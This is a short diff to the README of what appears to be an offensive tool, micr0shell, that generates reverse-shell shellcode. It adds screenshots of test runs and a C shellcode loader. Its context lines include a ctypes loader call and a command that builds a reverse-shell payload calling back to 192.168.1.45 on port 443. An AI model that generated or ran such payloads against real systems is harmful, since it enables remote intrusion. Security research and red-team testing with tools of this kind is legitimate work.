@@ -206,6 +206,22 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
 
 ## Test Case
 
+### Shellcode Bin File
+
+![image](/screenshot/msf_include_00.jpg)
+
+![image](/screenshot/msf_null_free.jpg)
+
+![image](/screenshot/micr0shell.jpg)
+
+### Simple Shellcode Loader in C
+
+![image](/screenshot/loader_msf.jpg)
+
+![image](/screenshot/loader_msf_include_00.jpg)
+
+![image](/screenshot/loader_micr0.jpg)
+
 ```cmd
 ─# python3 micr0shell.py --ip 192.168.1.45 --port 443 --type cmd --language csharp --variable sc --execution false --save True --output sc.bin
 
